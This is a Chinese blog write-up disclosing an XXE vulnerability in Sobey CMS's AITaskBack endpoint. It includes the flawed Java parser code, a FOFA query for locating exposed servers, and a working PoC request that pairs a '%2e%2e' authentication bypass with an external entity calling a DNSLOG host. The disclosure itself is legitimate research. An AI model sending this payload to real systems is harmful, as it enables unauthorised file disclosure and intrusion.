---
title: "索贝内容管理系统 /sobey-mchEditor/mch/AIInt/AITaskBack XML外部实体注入(XXE)漏洞"
source: https://mrxn.net/jswz/sobey-AIInt-AITaskBack-xxe.html
asset_dir: assets/索贝内容管理系统-sobey-mcheditormchaiintaitaskback-xml外部实体注入(xxe)漏洞
---

# 索贝内容管理系统 /sobey-mchEditor/mch/AIInt/AITaskBack XML外部实体注入(XXE)漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/19 08:20
- 722浏览
- [0评论](#comment)
- 24分钟阅读

深入探索

内容管理

application

SQL

---

# 漏洞简介

索贝 /sobey-mchEditor/mch/AIInt/AITaskBack 接口存在XML外部实体注入（[XXE](https://mrxn.net/tag/XXE)）漏洞。攻击者可以通过构造恶意的XML数据包，利用该漏洞读取服务器上的敏感文件或发起其他恶意操作，可能导致敏感信息泄露。

内容管理

# 影响版本

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"
>
> 代码安全审计

# 漏洞分析

深入探索

网络安全会议

安全运维咨询

漏洞扫描器

根据漏洞通告，搜索漏洞路由 `mch/AIInt/AITaskBack`

[![索贝内容管理系统 /sobey-mchEditor/mch/AIInt/AITaskBack XML外部实体注入(XXE)漏洞](images/img-001-5808e99f31ff.webp)](https://image.mrxn.net/192cc5f00a9c486c8106577642f5fbbc.webp)

直接进入看它的实现逻辑如下

漏洞修复方案

```
@RequestMapping(
    value = {"/AITaskBack"},
    method = {RequestMethod.POST}
)
public Response AITaskBack(HttpServletRequest req, @RequestParam("contentid") String contentid, @RequestParam(value = "token",required = false) String token, @RequestParam(value = "siteCode",required = false) String siteCode) throws HttpException, IOException {
    Response response = new Response();
    response.setStatus(200);
    HiveService hive = new HiveServiceImpl();
    String param = IOUtils.toString(req.getInputStream(), "UTF-8");
    logger.info("AI智能写稿回调参数为:" + param);
    int aiFlg = 2;

    try {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        StringReader sr = new StringReader(param);
        InputSource iss = new InputSource(sr);
        DocumentBuilder db = dbf.newDocumentBuilder();
        Document doc = db.parse(iss);
        NodeList dogList = doc.getElementsByTagName("TextResult");
        Node dog = dogList.item(0);
        String result = dog.getFirstChild().getNodeValue();
        JSONObject ret = JSONObject.fromObject(result);
        if (!ret.containsKey("code") || ret.getInt("code") != 200) {
            logger.error("智能服务回调返回失败：" + result);
            aiFlg = 0;
        }

        JSONArray results = ret.getJSONArray("results");
```

漏洞的根源在于变量 `param`，其值直接来自 `req.getInputStream()`，是攻击者可以完全控制的 HTTP 请求体。然后通过 `DocumentBuilderFactory.newInstance()` 获取一个工厂实例。这个方法返回的是 JAXP（Java API for XML Processing）规范的一个具体实现，通常是 JRE 中内置的 Xerces 解析器。在未进行安全配置的情况下，其行为取决于 JRE 的版本和系统环境的默认设置。在许多 Java 环境中（尤其是 Java 8 早期版本及更早版本），**默认是允许解析外部实体的**，这是一种不安全的设计。代码将安全性寄希望于运行环境的默认配置，而不是在代码层面强制实施安全策略，这是本次[XXE漏洞](https://mrxn.net/tag/XXE)产生的根本原因。

计算机服务器

# 漏洞复现

> 权限绕过相关分析可以参考之前的 [索贝融媒体 getList SQL注入漏洞](https://mrxn.net/jswz/sobey-Articlelist-getList-sqli.html) 的权限校验部分

```
POST /sobey-mchEditor/js/%2e%2e/mch/AIInt/AITaskBack?contentid=1&token=&siteCode= HTTP/1.1
Host: sobey.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://xxe.dnslog.pt/xxe_test">
]>
<root>
  <TextResult>&xxe;</TextResult>
</root>
```

[![索贝内容管理系统 /sobey-mchEditor/mch/AIInt/AITaskBack XML外部实体注入(XXE)漏洞](images/img-002-a8897d7d0092.webp)](https://image.mrxn.net/18d27f54e6c94226a1a6d453ad5a78ef.webp)

成功在DNSLOG平台收到DNS和HTTP请求

搜索引擎

- 标签：
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
